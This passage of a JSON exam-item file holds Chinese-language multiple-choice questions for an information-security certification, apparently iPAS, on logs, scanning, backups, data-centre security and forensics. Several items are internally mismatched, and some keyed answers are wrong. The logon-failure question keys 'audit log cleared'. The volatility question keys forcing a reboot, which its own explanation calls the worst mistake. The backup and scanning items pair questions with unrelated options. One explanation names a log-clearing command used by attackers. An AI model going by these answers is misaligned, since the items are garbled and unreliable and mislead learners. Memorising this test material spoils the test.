        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  },
  {
    "id": "IPAS-B-791",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "依據我國資通安全管理法規，關鍵資訊系統與資通設備之日誌紀錄（Log），法定最低應保存之期限為：",
    "options": [
      "A. 至少保存 180 天（約半年）以上",
      "B. 至少保存 30 天",
      "C. 至少保存 7 天",
      "D. 只要硬碟有空間才保存，無強制期限"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "依據我國資通安全責任等級分級辦法規定，公務機關與特定非公務機關之日誌紀錄至少必須留存 180 天。",
    "trap": "考題常以 30 天或 90 天作為干擾項，法定標準為 180 天。",
    "law": "《資通安全責任等級分級辦法》附表"
  },
  {
    "id": "IPAS-B-792",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "在 Windows 安全事件日誌中，用以表示「使用者登入失敗（Logon Failure）」之標準 Event ID 為何？",
    "options": [
      "A. 防毒軟體更新成功",
      "B. 安全審核日誌遭到手動或指令清除（The audit log was cleared）",
      "C. 建立了新的使用者帳號",
      "D. 系統成功重啟"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "Event ID 1102 代表安全日誌遭手動清除（如執行 wevtutil cl），在資安分析中被列為極度危險之滅證行為指標。",
    "trap": "攻擊者入侵後為掩飾行蹤常清除日誌，會觸發 1102。",
    "law": "微軟 Windows 安全日誌指南"
  },
  {
    "id": "IPAS-B-793",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "在網路維運與資安監控中，部署「網路時間協定（NTP）」確保全網設備時間同步之最主要資安價值在於：",
    "options": [
      "A. 關閉所有日誌之時間標籤",
      "B. 允許每台伺服器手動由管理員隨意調整時間",
      "C. 每天由人工打卡確認",
      "D. 全網伺服器與網路設備強制同步至標準可信之 NTP（網路時間協定）時間伺服器"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "NTP",
        "zh": "網路時間協定",
        "ipa": "/ˌen.tiːˈpiː/"
      }
    ],
    "explanation": "NTP 校時能保證所有端點、防火牆、伺服器之 Log 時間戳記毫秒不差，是進行事後威脅關聯分析與法律證據舉證的必備基石。",
    "trap": "時間若混亂，多設備間的關聯分析（SIEM Correlation）將完全失效。",
    "law": "RFC 5905 NTPv4"
  },
  {
    "id": "IPAS-B-794",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "在弱點掃描（Vulnerability Assessment）中，相較於「無憑證掃描」，「具憑證掃描（Credentialed Scan）」之主要優勢為何？",
    "options": [
      "A. 單純 Ping 掃描",
      "B. 無憑證黑箱掃描",
      "C. 網域名稱查詢",
      "D. 認證弱點掃描（Credentialed / Authenticated Scan）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "具憑證掃描使用主機合法帳號登入系統，能深入查詢本機軟體清單、登錄檔及內部安全組態，大幅降低誤報與漏報率。",
    "trap": "外部無憑證掃描只能看到開放的 Port 與橫幅（Banner），無法深入主機內部檢驗補丁。",
    "law": "NIST SP 800-115 測試指南"
  },
  {
    "id": "IPAS-B-795",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "經典的「3-2-1 備份原則」具體要求為何？",
    "options": [
      "A. 3-2-1 備份原則，且必須包含一份完全離線或不可竄改的實體隔離（Air-gap）複本",
      "B. 僅備份至本機 C 槽桌面",
      "C. 完全不做備份，僅靠防毒軟體",
      "D. 將備份檔透過匿名 FTP 上傳"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Air-gap",
        "zh": "實體隔離 / 離線斷網",
        "ipa": "/ˈer.ɡæp/"
      }
    ],
    "explanation": "現代勒索軟體會主動搜索並格式化內網所有在線備份 NAS，唯有透過 3-2-1 離線磁帶或不可變儲存（WORM），才能確保有安全乾淨的資料可還原。",
    "trap": "防勒索的核心是『離線隔離備份』。",
    "law": "CISA 勒索軟體防範指引"
  },
  {
    "id": "IPAS-B-796",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "關於「差異備份（Differential Backup）」之定義，下列敘述何者正確？",
    "options": [
      "A. 僅需要週三的增量備份",
      "B. 僅需要週日的完整備份",
      "C. 週日的完整備份 ＋ 週一、週二、週三之三次增量備份（需依序還原）",
      "D. 需要過去一個月內的所有備份"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "增量備份只記錄自上次任意備份後之異動。還原時必須先載入最後一次完整備份，再按日期順序逐一載入所有增量備份。",
    "trap": "增量備份優點為備份快速節省空間，缺點為還原步驟多且任一增量損毀即無法完全還原。",
    "law": "儲存與備份架構手冊"
  },
  {
    "id": "IPAS-B-797",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "在實體安全控制中，用以防止人員尾隨（Tailgating）進入高機敏區域的雙重連鎖門（Mantrap）機制，其運作原理為何？",
    "options": [
      "A. 僅張貼「請勿尾隨」之警語告示牌",
      "B. 長期開啟大門保持通風",
      "C. 一般木質喇叭鎖門",
      "D. 雙重認證防尾隨旋轉門（Mantrap / Air-lock，一次只容許一人進入）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "Mantrap 由兩道互鎖門組成，第一道門關閉並鎖定後，第二道門才可開啟驗證進入，能物理性完全杜絕尾隨潛入。",
    "trap": "實體安全必須仰賴物理互鎖結構而非僅靠自律宣導。",
    "law": "ISO/IEC 27001 A.7 實體安全"
  },
  {
    "id": "IPAS-B-798",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "在現代高科技資料中心機房中，最常見且不易破壞電子電氣設備之潔淨氣體自動滅火藥劑為：",
    "options": [
      "A. 泡沫滅火系統",
      "B. 乾粉滅火器手動噴灑",
      "C. 乾淨氣體自動滅火系統（如 FM-200, Novec 1230 或惰性氣體 IG-541）",
      "D. 傳統高壓水柱灑水系統"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "FM-200 等潔淨氣體透過化學抑燃吸熱滅火，滅火後揮發不留殘渣、不導電、不破壞精密電器設備，為機房標準配備。",
    "trap": "水灑水會導致伺服器短路直接報廢；乾粉具腐蝕性會侵蝕電子電路。",
    "law": "NFPA 2001 潔淨氣體滅火規範"
  },
  {
    "id": "IPAS-B-799",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "依據 NIST SP 800-88 媒體清除指南，「淨化（Purge）」層級之消磁（Degaussing）處理，其核心目標為何？",
    "options": [
      "A. 撕除硬碟標籤即可",
      "B. 直接丟入一般垃圾桶",
      "C. 僅在 Windows 中執行「右鍵格式化」",
      "D. 使用具備足夠高斯強度之專業消磁機（Degausser）徹底破壞磁軌結構，並送入實體破碎機物理粉碎"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Degaussing",
        "zh": "磁氣消磁銷毀",
        "ipa": "/diːˈɡaʊ.sɪŋ/"
      },
      {
        "en": "NIST SP 800-88",
        "zh": "美國國家標準媒體資料抹除規範",
        "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"
      }
    ],
    "explanation": "高敏感硬碟淘汰必須先經過專業消磁（Degaussing 使磁性粒子混亂徹底抹除），再送入物理破碎機碾碎成微小鐵屑，並出具銷毀證明與錄影留存。",
    "trap": "單純快速格式化完全無法阻止專業資料救援軟體提取原始機敏資料。",
    "law": "NIST SP 800-88 Rev.1"
  },
  {
    "id": "IPAS-B-800",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "監控日誌、弱點掃描、備份與實體安全",
    "scenario": false,
    "question": "依據數位鑑識（Digital Forensics）之「揮發性順序（Order of Volatility）」原則，當調查受駭主機時，下列何種數位資料最易遺失，必須第一優先採集？",
    "options": [
      "A. 計算原始硬碟之 SHA-256 雜湊值記錄於保管鏈文件",
      "B. 使用防寫裝置（Write Blocker）採集硬碟映像",
      "C. 直接手動按下電源按鈕將伺服器強制重啟或斷電關機",
      "D. 將網路線拔除防止惡意連線向外傳輸"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "依據揮發性順序，RAM（隨機存取記憶體）一旦斷電或重開機，暫存的關鍵惡意進程代碼、解密金鑰與網路連線紀錄將永久煙滅消失。",
    "trap": "現場採證大忌：隨意關機或重新開機！應維持通電狀態先進行記憶體導出（Memory Dump）。",
    "law": "RFC 3227 數位證據採集指南"
  }
];
